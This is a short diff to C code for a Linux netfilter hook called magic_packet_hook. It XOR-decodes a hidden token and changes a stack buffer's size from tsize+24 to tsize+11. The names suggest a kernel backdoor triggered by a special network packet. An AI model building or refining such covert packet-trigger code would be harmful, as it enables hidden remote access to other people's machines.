@@ -339,7 +339,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
 	const char *data;
 	char *token = TOKEN;
     	int tsize = strlen(token);
-	char _dt[tsize+24];
+	char _dt[tsize+11];
 
     	s_xor(token, 11, tsize);
 
